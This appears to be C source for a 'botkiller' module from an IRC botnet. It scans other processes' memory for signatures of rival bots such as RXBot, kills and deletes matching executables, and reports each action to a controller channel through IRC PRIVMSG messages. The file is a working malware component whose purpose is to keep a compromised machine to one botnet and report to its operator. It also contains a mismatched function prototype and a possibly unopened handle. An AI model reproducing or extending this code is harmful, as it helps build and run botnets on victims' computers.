/* A59's botkiller Credits to the sexy guy:)*/
#include "includes.h"
#include "externs.h"

void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ); 
void KillBot(SOCKET sock, PROCESSENTRY32 pe32 ); 
char msg[256];
struct s_Search 
{ 
   char* szBot; 
   char* szString; 
}; 

s_Search sSearch[ ] = 
{ 
   { "VNC Scanning Bot", "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A" }, 
   { "RXBot", "[MAIN]" }, 
   { "RXBot", "[SCAN]" }, 
   { "RXBot", "\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B" }, 
   { "RXBot", "\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D" }, 
   { "Unknown", "&echo bye" }, 
   { NULL, NULL } 
}; 

void DoSearch(SOCKET sock, unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ) 
{ 
   
   char szBigBuffer[ 0x5000 ] = { 0 }; 
   unsigned char Curbuf[ 0x500 ] = { 0 }; 

   HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
   for( unsigned long uCurAddr = uStartAddr; uCurAddr <= uEndAddr; uCurAddr++ ) 
   { 
      BOOL bRead = ReadProcessMemory( hProcess, (void *)uCurAddr, (void *)&Curbuf, sizeof( Curbuf ), NULL ); 
       
      if( bRead ) 
      { 
         int c = 0; 

         strcat( szBigBuffer, (char *)Curbuf );          

         while( sSearch[ c ].szString != NULL ) 
         { 
            if( strstr( szBigBuffer, sSearch[ c ].szString ) ) 
            { 
		      sprintf(msg,  "PRIVMSG %s :Found string \"%s\" in \"%s\" bot \"%s\"\n\n", channel,sSearch[ c ].szString, pe32.szExeFile, sSearch[ c ].szBot );
              send(sock, msg, strlen(msg), 0);
               Sleep(2000);
               KillBot(sock, pe32 );                
            } 
          
            c++; 
         } 

         if( sizeof( szBigBuffer ) > 0x150 ) 
            ZeroMemory( szBigBuffer, sizeof( szBigBuffer ) ); 
      } 
       
      if( !bRead ) 
         break; 
   } 

   CloseHandle( hProcess ); 
}; 

void KillBot(SOCKET sock, PROCESSENTRY32 pe32 ) 
{ 
   MODULEENTRY32 me32 = { 0 }; 
   HANDLE hPath = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe32.th32ProcessID ); 
   HANDLE hKillProcess; 

   me32.dwSize = sizeof( me32 ); 

   BOOL bRetval = Module32First( hPath, &me32 ); 
    
   while( bRetval ) 
   { 
      if( !strcmp( pe32.szExeFile, me32.szModule ) ) 
      { 
         SetFileAttributes( me32.szExePath, FILE_ATTRIBUTE_NORMAL ); 

         hKillProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID ); 
         TerminateProcess( hKillProcess, 0 ); 

         Sleep( 500 ); 

         if( DeleteFile( me32.szExePath ) ) 
	    sprintf(msg,  "PRIVMSG %s :Terminated and deleted %s\n", channel,me32.szExePath ); 
        send(sock, msg, strlen(msg), 0);
                     
      } 

      bRetval = Module32Next( hPath, &me32 ); 
   }    

   CloseHandle( hKillProcess ); 
   CloseHandle( hPath ); 
}; 

void botkiller(SOCKET sock) 
{ 
	
   char szFile[ 128 ]; 
   GetModuleFileName( GetModuleHandle( NULL ), szFile, sizeof( szFile ) ); 

   char* szBlockList[ ] = { "explorer.exe", "hidserv.exe", "WINLOGON.EXE", "SERVICES.EXE", szFile };       
   HANDLE hProcess = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ); 
   PROCESSENTRY32 pe32; 

   pe32.dwSize = sizeof( PROCESSENTRY32 ); 

   BOOL bRetval = Process32First( hProcess, &pe32 ); 
   bool bDoSearch = true; 

   while( bRetval ) 
   { 
      //Sleep( 250 ); 

      for( int i = 0; i < ( sizeof( szBlockList ) / sizeof( char* ) ); i++ ) 
      { 
         if( strstr( szBlockList[ i ], pe32.szExeFile ) ) 
            bDoSearch = false; 
      } 

      if( bDoSearch ) 
      { 
         DoSearch(sock, 0x00400000, 0x004FFFFF, pe32 ); 
         DoSearch(sock, 0x00100000 ,0x001FFFFF, pe32 ); 
      } 
       
      else 
         bDoSearch = true; 

      bRetval = Process32Next( hProcess, &pe32 ); 
   } 

   CloseHandle( hProcess );  
   getchar( ); 

 //  return 0; 
}; 
